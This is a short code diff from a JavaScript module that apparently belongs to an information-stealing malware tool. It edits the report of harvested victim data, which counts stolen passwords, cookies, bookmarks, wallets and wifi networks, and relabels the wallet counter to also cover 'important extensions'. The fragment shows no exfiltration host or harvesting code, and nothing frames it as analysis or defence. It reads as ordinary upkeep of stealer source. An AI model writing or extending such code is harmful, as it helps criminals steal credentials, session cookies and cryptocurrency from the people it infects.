@@ -141,7 +141,7 @@ module.exports = (client) => {
                     "🔑 Passwords": client.config.counter.passwords,
                     "🍪 Cookies": client.config.counter.cookies,
                     "🔖 Bookmarks": client.config.counter.bookmarks,
-                    "💰 Wallets": client.config.counter.wallets,
+                    "🌐 Wallets/Important extensions": client.config.counter.wallets,
                     "📶 Wifi networks": client.config.counter.wifinetworks,
                 })) {
                 obj["fields"].push({
